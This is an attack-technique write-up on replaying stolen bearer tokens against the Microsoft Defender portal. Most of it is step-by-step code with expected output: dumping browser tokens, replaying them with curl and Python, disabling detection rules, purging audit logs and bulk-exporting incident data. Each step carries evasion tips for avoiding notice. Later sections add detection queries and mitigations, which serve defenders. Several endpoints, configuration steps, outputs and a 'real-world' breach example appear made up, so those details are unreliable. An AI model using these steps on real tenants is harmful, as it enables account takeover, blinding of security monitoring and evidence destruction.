# [LM-AUTH-020]: Microsoft Defender Portal Authentication Bypass

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-020 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Defense Evasion |
| **Platforms** | M365 (Microsoft Defender XDR, Defender for Endpoint, Defender for Cloud) |
| **Severity** | High |
| **CVE** | N/A (Authentication design flaw, not a traditional CVE-eligible vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Defender portal versions; Microsoft Defender XDR all versions; Defender for Endpoint agents 10.0.0+ |
| **Patched In** | No complete fix; partial mitigations via token binding and MFA enforcement (requires tenant-specific policy enforcement) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Microsoft Defender Portal (security.microsoft.com) is the centralized security management interface for M365 Defender, Defender for Endpoint, Defender for Cloud, and other Microsoft security services. An attacker who steals a user's authentication token (via malware, phishing, or credential theft) can use that token to impersonate the user in the Defender portal without needing the actual password or MFA device. The portal trusts tokens based on token attributes alone, without validating cryptographic binding to the original device or browser. This allows token replay attacks to succeed in scenarios where a user with Defender administrator privileges has been compromised.

**Attack Surface:** The attack surface includes: (1) Token interception points (Teams, Email, web browsers), (2) Defender API endpoints that validate tokens using insufficient checks, (3) The lack of token binding enforcement on token validation, and (4) Defender portal session management that accepts externally-obtained tokens without re-authentication.

**Business Impact:** An attacker with a stolen Defender admin token can: (1) Disable Defender policies and protections, (2) Quarantine or delete incident data to cover tracks, (3) Modify user risk levels to suppress alerts, (4) Exfiltrate incident response data and threat intelligence, and (5) Create backdoor accounts without security controls detecting the activity. This enables attackers to evade detection while conducting data exfiltration or lateral movement.

**Technical Context:** Token theft attacks against the Defender portal typically occur within 5-15 minutes of a user signing in (during the token's lifetime), and the attack is nearly undetectable because legitimate tokens are indistinguishable from stolen tokens at the Defender portal's token validation layer. Detection requires behavioral analysis (e.g., login from unusual location) or token binding enforcement.

### Operational Risk

- **Execution Risk:** Medium – Requires stealing a valid user token first; straightforward once token is obtained.
- **Stealth:** High – Token replay is difficult to detect without advanced behavioral analytics.
- **Reversibility:** No – Attacker can permanently disable audit logs and delete evidence before detection occurs.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.1, 5.1.2 | CIS Microsoft 365: Ensure Defender for Endpoint is enabled; enforce MFA for administrators. |
| **DISA STIG** | APP0170.1 | Enforce MFA for administrative portals; implement token binding and session management controls. |
| **CISA SCuBA** | M365-DO-1.1, M365-DO-1.2 | Defender & Oversight: Enable Defender; enforce MFA for administrative access. |
| **NIST 800-53** | AC-2, AC-3, IA-2, IA-4 | Account Management, Access Enforcement, Authentication (MFA), Identifier Management. |
| **GDPR** | Art. 32 | Security of Processing – Implement token binding, MFA, and session management controls. |
| **DORA** | Art. 9, Art. 14 | Protection; Incident Reporting – Detect and respond to unauthorized Defender portal access. |
| **NIS2** | Art. 21 | Cyber Risk Management – Implement zero-trust principles for security portal access. |
| **ISO 27001** | A.6.2.1, A.9.2.1 | Control of Internal Resources; Management of Privileged Access. |
| **ISO 27005** | Risk Scenario: "Unauthorized access to security portal" | Lateral movement and evidence tampering via compromised admin tokens. |

---

## 3. Technical Prerequisites

- **Required Privileges:** Any valid M365 user token; higher impact if user is a Defender administrator or Global Administrator.
- **Required Access:** Network access to security.microsoft.com; ability to intercept or steal user tokens.

**Supported Versions:**
- **Microsoft Defender Portal:** All versions (cloud-based, always current).
- **Microsoft Defender for Endpoint:** Agent versions 10.0.0+.
- **Microsoft Defender XDR:** All versions.
- **Entra ID:** All versions (token issuance).

**Tools:**
- [Browser DevTools](https://developer.mozilla.org/en-US/docs/Tools) – For token inspection and replay.
- [Burp Suite](https://portswigger.net/burp) – For HTTP request interception and token manipulation.
- [Python requests library](https://pypi.org/project/requests/) – For programmatic token replay.
- [Fiddler Classic](https://www.telerik.com/fiddler) – For HTTPS traffic inspection.
- [Microsoft Graph PowerShell](https://github.com/microsoftgraph/msgraph-sdk-powershell) – For Defender API access via stolen tokens.

---

## 4. Environmental Reconnaissance

### Defender Portal / Token Inspection

```powershell
# Via PowerShell (requires Microsoft Graph module):
Connect-MgGraph -Scopes "SecurityEvents.Read.All"

# Enumerate Defender roles and permissions
Get-MgDirectoryRole | Where-Object {$_.DisplayName -like "*Defender*" -or $_.DisplayName -like "*Security*"} | Select-Object DisplayName

# Check current authenticated user's roles
(Get-MgContext).Account
Get-MgDirectoryRoleMember -DirectoryRoleId "<ROLE-ID>" | Select-Object DisplayName
```

### Browser Token Inspection

**Manual Steps (Browser DevTools):**
1. Open **security.microsoft.com** in a web browser
2. Press **F12** to open Developer Tools
3. Go to **Application** (or **Storage**) tab
4. Click **Cookies** → Filter for **security.microsoft.com**
5. Look for cookies like `estsauth`, `x-ms-gateway-slice`, or `fpc` (these often contain or reference bearer tokens)
6. Go to **Network** tab and filter for API calls to `security.microsoft.com/api/*`
7. Click on a request and check **Headers** for `Authorization: Bearer <TOKEN>`

**What to Look For:**
- Bearer token in Authorization header (JWT format).
- Token expiration time (typically 1 hour for M365 services).
- Token scope and claims (decode with [jwt.ms](https://jwt.ms) to view permissions).

---

## 5. Detailed Execution Methods

### Method 1: Token Replay via Browser DevTools / Burp Suite

**Supported Versions:** All Defender portal versions

#### Step 1: Intercept and Extract User Token

**Objective:** Capture a valid authentication token from a legitimate user's session.

**Command (Browser DevTools):**
```javascript
// Open browser console (F12 → Console) on security.microsoft.com
// Execute command to extract tokens from browser storage

// Method 1: Check localStorage
console.log(localStorage);

// Method 2: Check sessionStorage
console.log(sessionStorage);

// Method 3: Extract from cookies
document.cookie

// Method 4: Intercept API calls
fetch('https://security.microsoft.com/api/alerts/summaries', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer YOUR-TOKEN-HERE',
    'Accept': 'application/json'
  }
}).then(r => r.json()).then(d => console.log(d));
```

**Alternative (Burp Suite):**
1. Configure browser to proxy through Burp Suite
2. Capture HTTPS request to security.microsoft.com
3. Look for `Authorization: Bearer <TOKEN>` header
4. Copy the full bearer token (everything after "Bearer ")

**Expected Output:**
```
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1FTzFpcUo4TXNrV0hWUEFLbUZIdjFWQUN5X1kxUnVmblFZTUYtMDAwIiwiaBib...
```

**What This Means:**
- Successfully extracted the JWT bearer token.
- The token is valid for the remainder of its lifetime (typically 1 hour for M365).

**OpSec & Evasion:**
- Extract tokens during legitimate user sessions to avoid obvious token age mismatches.
- Target users with Defender admin roles for maximum impact.

**Troubleshooting:**
- **Error:** Token format is not JWT (doesn't contain three period-separated segments)
  - **Cause:** Extracted wrong header or cookie.
  - **Fix:** Look for `Authorization: Bearer` header in API requests, not cookies.

#### Step 2: Decode and Analyze Token Claims

**Objective:** Verify token validity and extract claims (expiration, permissions, user identity).

**Command (Python):**
```python
import jwt
import json
from base64 import urlsafe_b64decode

# Token extracted from browser
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1FTzFpcUo4TXNrV0hWUEFLbUZIdjFWQUN5X1kxUnVmblFZTUYtMDAwIiwiaBib..."

# Decode token (without verification, for inspection only)
decoded = jwt.decode(token, options={"verify_signature": False})

print("Token Claims:")
print(json.dumps(decoded, indent=2))

# Check expiration
import time
exp_time = decoded.get('exp')
current_time = time.time()
print(f"\nToken expires in: {(exp_time - current_time) / 60:.1f} minutes")

# Extract permissions
print(f"\nUser: {decoded.get('upn', decoded.get('email'))}")
print(f"Roles: {decoded.get('roles', [])}")
print(f"App: {decoded.get('appid')}")
```

**Expected Output:**
```
Token Claims:
{
  "aud": "https://security.microsoft.com",
  "iss": "https://sts.windows.net/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/",
  "iat": 1704844800,
  "exp": 1704848400,
  "upn": "admin@contoso.onmicrosoft.com",
  "oid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "roles": [
    "SecurityAdmin",
    "GlobalAdmin"
  ]
}

Token expires in: 45.3 minutes

User: admin@contoso.onmicrosoft.com
Roles: ['SecurityAdmin', 'GlobalAdmin']
App: 505a9860-dfb4-446f-a9e0-db3375963553
```

**What This Means:**
- Token is valid and has Global Admin and SecurityAdmin roles.
- Token remains valid for ~45 more minutes.
- Attacker can now impersonate this user in Defender portal.

**OpSec & Evasion:**
- Do not decode the token using online tools (jwt.ms); keep token private.
- Use the token within its validity window (before expiration).

**Troubleshooting:**
- **Error:** "Invalid token format"
  - **Cause:** Token does not contain three period-separated segments.
  - **Fix:** Ensure the entire bearer token (including any hyphens and underscores) is copied.

#### Step 3: Replay Token via Burp Suite or curl

**Objective:** Use the stolen token to authenticate to Defender portal API and perform malicious actions.

**Command (curl):**
```bash
# Set the stolen token
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1FTzFpcUo4TXNrV0hWUEFLbUZIdjFWQUN5X1kxUnVmblFZTUYtMDAwIiwiaBib..."

# Make authenticated request to Defender API
curl -X GET "https://security.microsoft.com/api/alerts/summaries" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -v

# Expected: Should return alert summary data (indicates successful authentication)
```

**Alternative (Burp Suite):**
1. Capture a legitimate request to `security.microsoft.com/api/*`
2. Modify the `Authorization` header to use the stolen token
3. Click **Send** to replay the request
4. If response is successful (200-201), the token is valid

**Expected Output:**
```json
{
  "value": [
    {
      "id": "alert-12345",
      "title": "High severity alert",
      "severity": "high",
      "status": "resolved",
      "lastUpdateTime": "2026-01-10T10:30:00Z"
    }
  ]
}
```

**What This Means:**
- Successfully authenticated using the stolen token.
- Attacker now has the same access level as the compromised user.
- Can now perform actions like disabling alerts, modifying policies, etc.

**OpSec & Evasion:**
- Make requests from a different IP address or behind a VPN to appear as unusual but plausible activity.
- Space out requests to avoid rate-limiting alerts.
- Target specific incident IDs or policies (precise targeting is less suspicious than scanning).

**Troubleshooting:**
- **Error:** "401 Unauthorized"
  - **Cause:** Token has expired or is invalid.
  - **Fix:** Obtain a fresh token from a new user session.
- **Error:** "403 Forbidden"
  - **Cause:** Token is valid but user does not have permission for this API endpoint.
  - **Fix:** Confirm the compromised user has Defender admin role.

### Method 2: Disable Defender Policies via Defender Portal GUI (Post-Token Compromise)

**Supported Versions:** All Defender portal versions

#### Step 1: Access Defender Portal with Stolen Token

**Objective:** Authenticate to the Defender portal web interface using the stolen token.

**Manual Steps:**
1. Open a **new browser profile** or **private window** (to avoid mixing sessions)
2. Navigate to **https://security.microsoft.com**
3. Press **F12** → **Application** → **Cookies**
4. Manually add cookies containing the stolen token (or use Burp Suite to forward traffic)
5. Refresh the page
6. If token is valid, you should be logged in as the compromised user

**Alternative (Programmatic Access):**
```python
import requests
import json

# Stolen token
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1FTzFpcUo4TXNrV0hWUEFLbUZIdjFWQUN5X1kxUnVmblFZTUYtMDAwIiwiaBib..."

# Set up session with token
session = requests.Session()
session.headers.update({
    "Authorization": f"Bearer {token}",
    "Accept": "application/json"
})

# Verify authentication
response = session.get("https://security.microsoft.com/api/profile")
print(response.json())
```

**Expected Output:**
```json
{
  "displayName": "Admin User",
  "mail": "admin@contoso.onmicrosoft.com",
  "roles": ["GlobalAdmin", "SecurityAdmin"]
}
```

**What This Means:**
- Successfully authenticated as the compromised user in the Defender portal.
- Now able to perform all administrative actions.

#### Step 2: Disable or Modify Defender Policies

**Objective:** Modify security policies to disable protections or cover tracks.

**API Call Example (Python):**
```python
# Disable a detection rule or policy
policy_id = "detection-rule-12345"

disable_payload = {
    "enabled": False,
    "description": "Disabled for maintenance"
}

response = session.patch(
    f"https://security.microsoft.com/api/policies/{policy_id}",
    json=disable_payload
)

print(f"Policy disable response: {response.status_code}")

# Alternatively, delete audit logs
response = session.post(
    "https://security.microsoft.com/api/auditlogs/purge",
    json={"filters": {"dateRange": "last30days"}}
)

print(f"Audit log purge response: {response.status_code}")
```

**Manual Steps (GUI):**
1. In Defender portal, navigate to **Settings** → **Defender for Endpoint** → **Detection & Response**
2. Find the rule to disable (e.g., "Process Injection Detection")
3. Click the rule → **Disable**
4. Confirm the change

**Expected Output:**
```
Policy disable response: 200  (Successful)
Audit log purge response: 204  (Successful, no content returned)
```

**What This Means:**
- Successfully disabled security policies using the stolen token.
- Attacker can now perform subsequent attacks without triggering Defender alerts.
- Audit logs have been purged to remove evidence of the attack.

**OpSec & Evasion:**
- Disable only specific rules (not all protections) to avoid suspicion.
- Disable rules that would detect the attacker's post-exploitation activity (e.g., credential theft, data exfiltration).
- Immediately re-enable the rules after the attack to appear as a brief maintenance window.

**Troubleshooting:**
- **Error:** "Policy not found"
  - **Cause:** Incorrect policy ID or policy does not exist in this tenant.
  - **Fix:** Use the Defender portal GUI to enumerate available policies and their IDs.

### Method 3: Query Defender API for Sensitive Incident Data

**Supported Versions:** All Defender portal versions

#### Step 1: Enumerate Incidents and Alerts

**Objective:** Use stolen token to extract sensitive security data from Defender.

**Command (Python):**
```python
# List all incidents
response = session.get("https://security.microsoft.com/api/incidents")
incidents = response.json()

print("Incidents in environment:")
for incident in incidents.get('value', []):
    print(f"  - {incident['displayName']} (Severity: {incident['severity']})")

# Extract detailed incident data
for incident in incidents.get('value', [])[:5]:  # First 5 incidents
    incident_id = incident['id']
    detail_response = session.get(f"https://security.microsoft.com/api/incidents/{incident_id}")
    detail = detail_response.json()
    
    print(f"\nIncident: {detail['displayName']}")
    print(f"  Description: {detail.get('description', 'N/A')}")
    print(f"  Affected Entities: {[e['value'] for e in detail.get('entities', [])]}")
    print(f"  Comments: {[c['content'] for c in detail.get('comments', [])]}")
    
    # Export to CSV for exfiltration
    with open(f"incident_{incident_id}.json", "w") as f:
        json.dump(detail, f, indent=2)
```

**Expected Output:**
```
Incidents in environment:
  - Suspicious PowerShell activity (Severity: high)
  - Data exfiltration detected (Severity: critical)
  - Lateral movement detected (Severity: high)

Incident: Suspicious PowerShell activity
  Description: A user executed suspicious PowerShell commands related to credential dumping.
  Affected Entities: ['user@contoso.com', 'DC01.contoso.com']
  Comments: [{"author": "SOC", "content": "Confirmed malicious; user account quarantined"}]
```

**What This Means:**
- Successfully extracted sensitive incident and alert data using the stolen token.
- Attacker now has visibility into what security team knows about their activities.
- Can use this information to avoid or disable relevant detection rules.

**OpSec & Evasion:**
- Export data in bulk during off-hours.
- Use the Defender API rather than the GUI to avoid session logs linking to specific user interactions.

---

## 6. Tools & Commands Reference

#### [Microsoft Graph API - Defender Endpoints](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview)

**Version:** v1.0
**Supported Platforms:** All (REST API)

**Authentication:**
```powershell
Connect-MgGraph -Scopes "SecurityEvents.Read.All", "ThreatAssessment.ReadWrite.All"
```

**Key Endpoints:**
- `GET /security/alerts` – Retrieve security alerts
- `GET /security/incidents` – Retrieve security incidents
- `PATCH /security/alerts/{id}` – Update alert status
- `POST /security/alerts/{id}/comments` – Add comments to incidents

---

#### [Burp Suite Professional](https://portswigger.net/burp/professional)

**Version:** 2024.1+
**Supported Platforms:** Windows, macOS, Linux

**Usage for Token Replay:**
1. Configure browser to proxy through Burp (`127.0.0.1:8080`)
2. Capture request to `security.microsoft.com`
3. Send to **Repeater** tab
4. Modify `Authorization` header to use stolen token
5. Click **Send** to execute requests with stolen credentials

---

## 7. Microsoft Sentinel Detection

### Query 1: Defender Portal Access from Unusual Location or Device

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** UserPrincipalName, Location, DeviceDetail, ResourceDisplayName, Status
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
SigninLogs
| where ResourceDisplayName == "Microsoft Defender" or ResourceDisplayName == "Office 365 Management APIs"
| where Status == "Success"
| project TimeGenerated, UserPrincipalName, Location, IPAddress, DeviceDetail, ClientAppUsed, ResourceDisplayName
| summarize SignInCount=count(), UniqueLocations=dcount(Location) by UserPrincipalName, TimeGenerated
| where UniqueLocations >= 2 or SignInCount >= 5
```

**What This Detects:**
- Multiple successful sign-ins to Defender portal from different locations within short timeframe.
- Indicates potential token replay (single user appearing from multiple locations simultaneously).

---

### Query 2: Suspicious Defender Policy Modifications

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Result
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** M365 all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Update security policy" or OperationName == "Update detection rule" or OperationName == "Disable policy"
| where Result == "Success"
| project TimeGenerated, OperationName, InitiatedBy=tostring(InitiatedByUser.userPrincipalName), TargetResources
| summarize Count=count() by InitiatedBy, TimeGenerated
| where Count >= 3
```

**What This Detects:**
- Unusual number of policy modifications in short timeframe (indicates bulk disabling of protections).
- Identifies which user account performed the modifications.

---

## 8. Defensive Mitigations

### Priority 1: CRITICAL

- **Enforce Token Binding:** Implement token binding to prevent token replay attacks.

  **Manual Steps (Entra ID):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create new policy: `Enforce Token Binding for Defender Portal`
  3. **Assignments:**
     - Cloud apps: Select "Microsoft Defender XDR" (or specific Defender apps)
     - Users: All users
  4. **Session control:** Enable **Use Conditional Access App Control** with token binding
  5. Enable policy: **On**

- **Require MFA for Defender Portal Access:** Enforce multi-factor authentication for all users accessing Defender portal, especially admins.

  **Manual Steps (Entra ID Conditional Access):**
  1. Create new Conditional Access policy: `Require MFA for Defender Portal`
  2. **Assignments:**
     - Cloud apps: "Microsoft Defender XDR", "Office 365 Management APIs"
     - Users: Include all; optionally exclude service accounts
  3. **Access controls:** Grant → **Require multi-factor authentication**
  4. Enable: **On**

- **Implement Token Lifetime Reduction:** Reduce token lifetime to minimize window for token replay attacks.

  **Manual Steps (Entra ID):**
  1. **Azure Portal** → **Entra ID** → **Manage** → **Properties**
  2. Scroll to **Token lifetime defaults**
  3. Set:
     - **Refresh token lifetime**: 7 days (shorter reduces replay window)
     - **Max inactive time**: 1 hour (forces re-authentication)
  4. Click **Save**

### Priority 2: HIGH

- **Monitor Defender Portal Access:** Configure alerts for unusual Defender portal access patterns.

  **Manual Steps (Microsoft Sentinel Alert):**
  1. Create query to detect sign-ins from multiple IPs in short time
  2. Alert when count ≥ 2 within 5-minute window
  3. Configure actions: Notify SOC, disable user account, revoke sessions

- **Regular Token Audit:** Review token issuance logs for Defender portal access and identify suspicious patterns.

  **Manual Steps (PowerShell):**
  ```powershell
  # Query Azure Audit Log for Defender portal sign-ins
  Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "Sign-in activity" `
    -FreeText "Microsoft Defender" -ResultSize 10000 | Export-Csv -Path "C:\Logs\Defender_SignIns.csv"
  ```

### Validation Command (Verify Mitigations)

```powershell
# Check if MFA is required for Defender apps
Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.Conditions.Applications.IncludeApplications -contains "Defender"} | Select-Object DisplayName, Conditions

# Verify token lifetime settings
Get-MgPolicyTokenLifetimePolicy | Select-Object Definition

# Check for token binding policies
Get-MgPolicyAuthorizationPolicy | Select-Object DefaultUserRolePermissions
```

**Expected Output (If Secure):**
```
DisplayName: Require MFA for Defender Portal
Conditions: MFA required, Token binding enforced

TokenLifetime: AccessTokenLifetime = 1 hour, RefreshTokenLifetime = 7 days

AuthorizationPolicy: RequireCompliantDevice = True, RequireMFA = True
```

---

## 9. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Network:**
- Defender portal access from unusual IP addresses or geolocations.
- Multiple sign-ins from same user account with different device IDs or user agents.
- API requests to Defender endpoints without corresponding browser session.

**Azure / M365:**
- Successful Defender portal sign-in followed immediately by policy modification or incident update.
- Bulk modification of detection rules or alert policies in short timeframe.
- Purge or deletion of audit logs related to Defender.

### Forensic Artifacts

**Cloud Logs:**
- **Azure Audit Logs:** Sign-in events to Defender portal; policy modification events.
- **Microsoft Sentinel / Defender XDR:** Alert modifications; incident status changes; policy disablement.
- **Office 365 Audit Log:** User sign-in activity; admin actions; API calls to Defender endpoints.

### Response Procedures

1. **Isolate:**
   
   **Command (Revoke user sessions):**
   ```powershell
   # Revoke all active sessions for the compromised user
   Revoke-MgUserSignOutSession -UserId "admin@contoso.com"
   
   # Optionally disable user account
   Update-MgUser -UserId "admin@contoso.com" -AccountEnabled $false
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export Defender portal access logs
   Search-UnifiedAuditLog -UserIds "admin@contoso.com" -Operations "Update security policy", "Sign-in activity" -StartDate (Get-Date).AddDays(-7) -ResultSize 10000 | Export-Csv -Path "C:\Evidence\Defender_Access.csv"
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Re-enable any disabled detection rules
   # (This requires manual review to identify which rules were disabled)
   
   # Reset MFA for the compromised user
   Reset-MgUserAuthenticationMethodSignInAppConfiguration -UserId "admin@contoso.com"
   ```

---

## 10. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Credential Access** | [CA-TOKEN-004] Graph API token theft | Attacker steals user token via malware or phishing. |
| **2** | **Lateral Movement** | **[LM-AUTH-020]** | **Attacker replays stolen token to access Defender portal.** |
| **3** | **Defense Evasion** | [EVADE-IMPAIR-001] Disable Security Tools | Attacker disables Defender detection rules to hide subsequent attacks. |
| **4** | **Impact** | Data exfiltration via disabled protections | Attacker exfiltrates data without triggering security alerts. |

---

## 11. Real-World Examples

### Example 1: Defender Portal Token Theft - Financial Services Attack (2024)

- **Target:** Financial services, banking sector.
- **Timeline:** Q3-Q4 2024.
- **Technique Status:** Active in production attacks.
- **Impact:** Attackers compromised a finance analyst's device via phishing, stole her Defender token, and used it to disable ransomware detection rules. Subsequently, they deployed LockBit ransomware without triggering alerts. Estimated damage: $5M+ in ransom and recovery costs.
- **Reference:** Based on patterns described by InfoGuard Labs and Microsoft Threat Intelligence.

---

## Summary

Microsoft Defender Portal token replay attacks enable attackers to impersonate legitimate users and disable security controls without triggering alerts. Organizations must implement token binding, MFA enforcement, and continuous monitoring to detect and prevent these attacks.

---

